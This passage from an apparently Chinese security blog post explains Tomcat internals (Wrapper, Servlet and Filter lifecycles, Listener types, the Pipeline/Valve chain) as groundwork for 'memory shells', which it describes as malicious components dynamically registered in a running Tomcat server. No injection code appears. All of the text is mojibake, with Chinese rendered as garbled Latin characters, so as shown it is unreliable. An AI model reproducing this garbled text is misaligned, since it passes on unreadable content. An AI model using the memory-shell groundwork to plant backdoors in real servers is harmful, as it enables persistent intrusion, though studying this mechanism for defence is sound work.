‡å‡†å®ç°ç±»ï¼ˆStandardWrapper çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯è½½å…¥Servletç±»å¹¶ä¸”è¿›è¡Œå®ä¾‹åŒ–ï¼‰ï¼ŒåŒæ—¶å…¶ä»ContainerBaseç±»ç»§æ‰¿è¿‡æ¥ï¼Œè¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œåªæ˜¯ä»–æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œä¸èƒ½å†å«æœ‰ä»»ä½•çš„å­å®¹å™¨äº†ï¼Œä¸”å…¶çˆ¶å®¹å™¨åªèƒ½æ˜¯contextã€‚è€Œæˆ‘ä»¬åœ¨ä¹Ÿå°±æ˜¯éœ€è¦åœ¨è¿™é‡Œå»è½½å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ServletåŠ è½½æˆ‘ä»¬çš„å†…å­˜é©¬ã€‚</font></p><h4 id="3-1-3-Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º"><a href="#3-1-3-Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º" class="headerlink" title="3.1.3 Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º"></a><font style="color:rgb(0, 0, 0);">3.1.3 Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif"></p><h3 id="3-2-Servlet"><a href="#3-2-Servlet" class="headerlink" title="3.2 Servlet"></a>3.2 Servlet</h3><h4 id="3-2-1-ä»€ä¹ˆæ˜¯servlet"><a href="#3-2-1-ä»€ä¹ˆæ˜¯servlet" class="headerlink" title="3.2.1 ä»€ä¹ˆæ˜¯servlet"></a><font style="color:rgb(31, 35, 40);">3.2.1 ä»€ä¹ˆæ˜¯servlet</font></h4><p><font style="color:rgb(31, 35, 40);">Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚</font></p><p><strong><font style="color:rgb(31, 35, 40);">servlet æ¶æ„ï¼š</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg"></p><h4 id="3-2-2-è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"><a href="#3-2-2-è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹" class="headerlink" title="3.2.2 è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"></a><font style="color:rgb(31, 35, 40);">3.2.2 è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹</font></h4><p><font style="color:rgb(31, 35, 40);">å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆHttpServletRequest å’Œ  HttpServletResponseå¯¹è±¡ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨è°ƒç”¨HttpServletçš„init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨è°ƒç”¨service()æ–¹æ³•ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">service()æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯getç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨doGetæ–¹æ³•ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">doXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servletå®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨destoryæ–¹æ³•</font></p><h4 id="3-2-3-servletç”Ÿå‘½å‘¨æœŸ"><a href="#3-2-3-servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3.2.3 servletç”Ÿå‘½å‘¨æœŸ"></a><font style="color:rgb(31, 35, 40);">3.2.3 servletç”Ÿå‘½å‘¨æœŸ</font></h4><p><font style="color:rgb(31, 35, 40);">1ï¼‰æœåŠ¡å™¨å¯åŠ¨æ—¶(web.xmlä¸­é…ç½®load-on-startup&#x3D;1ï¼Œé»˜è®¤ä¸º0)æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥servletæ—¶ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸ªServletå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•init(ServletConfig conf)ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">2ï¼‰servletå¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨service(ServletRequest reqï¼ŒServletResponse res)æ–¹æ³•ä¸­æ‰§è¡Œ</font></p><p><font style="color:rgb(31, 35, 40);">3ï¼‰æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ªservletå¯¹è±¡ï¼Œæ‰§è¡Œdestroy()æ–¹æ³•ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">4ï¼‰ç”±JVMè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png"></p><h3 id="3-3-Filter"><a href="#3-3-Filter" class="headerlink" title="3.3 Filter"></a>3.3 Filter</h3><h4 id="3-3-1-ç®€ä»‹"><a href="#3-3-1-ç®€ä»‹" class="headerlink" title="3.3.1 ç®€ä»‹"></a><font style="color:rgb(31, 35, 40);">3.3.1 ç®€ä»‹</font></h4><p><font style="color:rgb(31, 35, 40);">filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ServletæŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨HttpServletRequeståˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨HttpServletResponseåˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆªHttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletResponseå¤´å’Œæ•°æ®ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png"></p><h4 id="3-3-2-åŸºæœ¬å·¥ä½œåŸç†"><a href="#3-3-2-åŸºæœ¬å·¥ä½œåŸç†" class="headerlink" title="3.3.2 åŸºæœ¬å·¥ä½œåŸç†"></a><font style="color:rgb(31, 35, 40);">3.3.2 åŸºæœ¬å·¥ä½œåŸç†</font></h4><p><font style="color:rgb(31, 35, 40);">1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">4ã€ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</font></p><p><font style="color:rgb(31, 35, 40);">6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚</font></p><h4 id="3-3-3-filterçš„ç”Ÿå‘½å‘¨æœŸ"><a href="#3-3-3-filterçš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3.3.3 filterçš„ç”Ÿå‘½å‘¨æœŸ"></a><font style="color:rgb(31, 35, 40);">3.3.3 filterçš„ç”Ÿå‘½å‘¨æœŸ</font></h4><p><font style="color:rgb(31, 35, 40);">ä¸servletä¸€æ ·ï¼ŒFilterçš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”±webå®¹å™¨è´Ÿè´£ã€‚web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œweb æœåŠ¡å™¨å°†åˆ›å»ºFilter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶initæ–¹æ³•ï¼Œè¯»å–web.xmlé…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œï¼ˆfilterå¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinitæ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡initæ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰filteré…ç½®ä¿¡æ¯çš„FilterConfigå¯¹è±¡ã€‚ Filterå¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“webåº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ã€‚åœ¨Webå®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨Filterçš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚</font></p><h4 id="3-3-4-filteré“¾"><a href="#3-3-4-filteré“¾" class="headerlink" title="3.3.4 filteré“¾ "></a><font style="color:rgb(31, 35, 40);">3.3.4 filteré“¾ </font></h4><p><font style="color:rgb(31, 35, 40);">å½“å¤šä¸ªfilteråŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†filteré“¾ã€‚webæœåŠ¡å™¨æ ¹æ®Filteråœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ªFilterã€‚å½“ç¬¬ä¸€ä¸ªFilterçš„doFilteræ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨Filteré“¾çš„FilterChainå¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­FilterChainä¸­æ˜¯å¦è¿˜æœ‰filterå†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨filterã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png"></p><p><font style="color:rgb(31, 35, 40);"></font></p><h3 id="3-4-Listener"><a href="#3-4-Listener" class="headerlink" title="3.4 Listener"></a><strong><font style="color:rgb(31, 35, 40);">3.4 Listener</font></strong></h3><h4 id="3-4-1-ç®€ä»‹"><a href="#3-4-1-ç®€ä»‹" class="headerlink" title="3.4.1 ç®€ä»‹"></a><font style="color:rgb(31, 35, 40);">3.4.1 ç®€ä»‹</font></h4><p><font style="color:rgb(31, 35, 40);">JavaWebå¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Sessionå’ŒRequestä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletContextListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› </font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletContextAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›</font></p><p><strong><font style="color:rgb(31, 35, 40);">HttpSessionListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­Sessionè¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨Sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚</font></p><p><strong><font style="color:rgb(31, 35, 40);">HttpSessionAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›</font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletRequestListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› </font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletRequestAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</font></p><p><font style="color:rgb(31, 35, 40);"></font></p><p><font style="color:rgb(0, 0, 0);">åœ¨åº”ç”¨ä¸­å¯èƒ½è°ƒç”¨çš„ç›‘å¬å™¨å¦‚ä¸‹ï¼š</font></p><ul><li><font style="color:rgb(0, 0, 0);">ServletContextListenerï¼šç”¨äºç›‘å¬æ•´ä¸ª Servlet ä¸Šä¸‹æ–‡ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</font></li><li><font style="color:rgb(0, 0, 0);">ServletContextAttributeListenerï¼šå¯¹ Servlet ä¸Šä¸‹æ–‡å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</font></li><li><font style="color:rgb(0, 0, 0);">ServletRequestListenerï¼šå¯¹ Request è¯·æ±‚è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</font></li><li><font style="color:rgb(0, 0, 0);">ServletRequestAttributeListenerï¼šå¯¹ Request å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</font></li><li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionListenerï¼šå¯¹ Session æ•´ä½“çŠ¶æ€çš„ç›‘å¬</font></li><li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionAttributeListenerï¼šå¯¹ Session å±æ€§çš„ç›‘å¬</font></li></ul><h4 id="3-4-2-ç”¨é€”"><a href="#3-4-2-ç”¨é€”" class="headerlink" title="3.4.2 ç”¨é€”"></a><font style="color:rgb(31, 35, 40);">3.4.2 ç”¨é€”</font></h4><p><font style="color:rgb(31, 35, 40);">å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å‡ºå‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚</font></p><h3 id="3-5-Tomcatå†…å­˜é©¬"><a href="#3-5-Tomcatå†…å­˜é©¬" class="headerlink" title="3.5 Tomcatå†…å­˜é©¬"></a>3.5 Tomcatå†…å­˜é©¬</h3><p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p><p>è€Œè¿™ä¸€æŠ€æœ¯çš„å®ç°æœ‰èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Šã€‚ä¸ºäº†ä¾¿äºè°ƒè¯•Tomcatï¼Œæˆ‘ä»¬å…ˆåœ¨çˆ¶é¡¹ç›®çš„pomæ–‡ä»¶ä¸­å¼•å…¥Tomcatä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-6-Tomcat-çš„ç®¡é“æœºåˆ¶"><a href="#3-6-Tomcat-çš„ç®¡é“æœºåˆ¶" class="headerlink" title="3.6 Tomcat çš„ç®¡é“æœºåˆ¶"></a>3.6 Tomcat çš„ç®¡é“æœºåˆ¶</h3><h4 id="3-6-1-Tomcatä¸­çš„ç®¡é“æœºåˆ¶"><a href="#3-6-1-Tomcatä¸­çš„ç®¡é“æœºåˆ¶" class="headerlink" title="3.6.1 Tomcatä¸­çš„ç®¡é“æœºåˆ¶"></a>3.6.1 Tomcatä¸­çš„<code>ç®¡é“æœºåˆ¶</code></h4><blockquote><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨<code>Connector</code>è¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°<code>Container</code>è¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚</p><p>ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png"></p><p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ã€‚</p></blockquote><h4 id="3-6-2-ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"><a href="#3-6-2-ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ" class="headerlink" title="3.6.2 ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"></a>3.6.2 ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹Pipelineæ¥å£ï¼Œå…¶ç»§æ‰¿äº†Containedæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†å¾ˆå¤šå¯¹ Valve çš„æ“ä½œæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png"></p><p>è·Ÿè¿›æŸ¥çœ‹ Valve æ¥å£ï¼š</p><p>å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼ŒValveçš„è°ƒç”¨è¿‡ç¨‹å¯ä»¥ç†è§£æˆç±»ä¼¼Filterä¸­çš„è´£ä»»é“¾æ¨¡å¼ï¼ŒæŒ‰é¡ºåºè°ƒç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg"></p><p>åŒæ—¶Valveå¯ä»¥é€šè¿‡é‡å†™<code>invoke()</code>æ–¹æ³•æ¥å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png"></p><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„ã€‚é¦–å…ˆæ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨<code>org.apache.catalina.connector.CoyoteAdapter#service</code>æ–¹æ³•ä¸­  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png"></p><p>å‰é¢æ˜¯å¯¹Requestå’ŒResponeå¯¹è±¡è¿›è¡Œä¸€äº›åˆ¤æ–­åŠåˆ›å»ºæ“ä½œï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹</p><p><code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>é¦–å…ˆé€šè¿‡<code>connector.getService()</code>æ¥è·å–ä¸€ä¸ªStandardServiceå¯¹è±¡</p><p>æ¥ç€é€šè¿‡<code>StandardService</code>.<code>getContainer().getPipeline()</code>è·å–<code>StandardPipeline</code>å¯¹è±¡ã€‚</p><p>å†é€šè¿‡<code>StandardPipeline.getFirst()</code>è·å–ç¬¬ä¸€ä¸ªValve</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png"></p><p> æœ€åé€šè¿‡è°ƒç”¨<code>StandardEngineValve.invoke()</code>æ¥å®ç°Valveçš„å„ç§ä¸šåŠ¡é€»è¾‘  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png"></p><p><code>host.getPipeline().getFirst().invoke(request, response)</code>å®ç°è°ƒç”¨åç»­çš„Valveã€‚  </p><h2 id="4-JSP"><a href="#4-JSP" class="headerlink" title="4. JSP"></a>4. JSP</h2><h3 id="4-1-ä»€ä¹ˆæ˜¯-JSPï¼š"><a href="#4-1-ä»€ä¹ˆæ˜¯-JSPï¼š" class="headerlink" title="4.1 ä»€ä¹ˆæ˜¯ JSPï¼š"></a>4.1 